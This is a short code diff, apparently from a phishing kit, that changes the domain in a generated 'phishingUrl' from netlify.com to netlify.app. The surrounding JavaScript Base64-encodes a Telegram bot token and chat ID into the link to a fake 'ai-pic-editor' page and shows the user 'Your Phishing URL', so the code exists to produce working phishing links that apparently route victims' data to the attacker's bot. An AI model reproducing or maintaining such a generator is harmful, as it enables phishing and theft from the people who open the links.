@@ -143,7 +143,7 @@
             try {
                 const encodedToken = btoa(botToken); // Base64 encode
                 const encodedChatId = btoa(chatId);
-                const phishingUrl = `https://scorpion-yug.netlify.com/ai-pic-editor.html?t=${encodedToken}&c=${encodedChatId}`;
+                const phishingUrl = `https://scorpion-yug.netlify.app/ai-pic-editor.html?t=${encodedToken}&c=${encodedChatId}`;
                 urlOutput.innerHTML = `Your Phishing URL >>> <a href="${phishingUrl}" target="_blank">${phishingUrl}</a>`;
             } catch (err) {
                 urlOutput.innerText = 'Error generating URL: Invalid input!';
